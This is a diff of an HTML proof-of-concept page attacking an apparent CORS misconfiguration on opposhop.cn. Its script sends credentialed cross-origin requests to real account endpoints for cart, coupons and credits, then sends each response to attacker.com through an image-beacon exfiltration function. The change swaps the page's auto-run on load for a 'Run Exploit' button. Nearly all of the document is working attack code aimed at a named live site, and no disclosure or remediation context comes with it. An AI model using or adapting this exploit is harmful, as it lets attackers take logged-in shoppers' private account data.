@@ -7,64 +7,52 @@
 
 <body>
 
-<h2>OPPO CORS Exploit Proof of Concept</h2>
+<h2>OPPO CORS Data Exfiltration PoC</h2>
+<button onclick="run()">Run Exploit</button>
 
-<pre id="output">Loading...</pre>
+<pre id="output">Waiting...</pre>
 
 <script>
-function encodeData(str) {
-    return btoa(unescape(encodeURIComponent(str)));
-}
-
-function exfiltrate(label, data) {
+function exfiltrate(data) {
     try {
-        var img = new Image();
-        img.src = "https://attacker.com/log?d=" + encodeData(label + ":" + data);
-    } catch(e) {
-        console.log("Exfil error:", e);
-    }
+        var i = new Image();
+        i.src = "https://attacker.com/log?d=" + encodeURIComponent(data);
+    } catch(e) {}
 }
 
-function fetchData(url, label) {
-    fetch(url, {
-        method: "GET",
-        mode: "cors",
-        credentials: "include",
-        cache: "no-store",
-        redirect: "follow",
-        referrerPolicy: "no-referrer-when-downgrade"
-    })
-    .then(r => {
-        console.log(label + " status:", r.status);
-        return r.text();
-    })
-    .then(data => {
-        document.getElementById("output").innerText += "\n\n### " + label + "\n" + data;
-        exfiltrate(label, data);
-    })
-    .catch(err => {
-        document.getElementById("output").innerText += "\n\n### " + label + "\nError: " + err;
-    });
+async function request(url, name) {
+    try {
+        let res = await fetch(url, {
+            method: "GET",
+            credentials: "include",
+            mode: "cors"
+        });
+
+        let text = await res.text();
+
+        document.getElementById("output").innerText += "\n\n[" + name + "]\n" + text;
+
+        exfiltrate(name + ":" + text);
+
+    } catch (e) {
+        document.getElementById("output").innerText += "\n\n[" + name + "] ERROR\n" + e;
+    }
 }
 
 function run() {
 
-    document.getElementById("output").innerText = "";
+    document.getElementById("output").innerText = "Loading...";
 
-    console.log("Cookies:", document.cookie);
+    request("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list", "cart");
 
-    fetchData("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list", "cart");
+    request("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", "count");
 
-    fetchData("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", "count");
+    request("https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1", "coupons");
 
-    fetchData("https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1", "coupons");
+    request("https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit", "credit");
 
-    fetchData("https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit", "credit");
-
-    fetchData("https://www.opposhop.cn/cn/oapi/credits/web/credits/show", "credits_new");
+    request("https://www.opposhop.cn/cn/oapi/credits/web/credits/show", "credits_new");
 }
-
-window.onload = run;
 </script>
 
 </body>
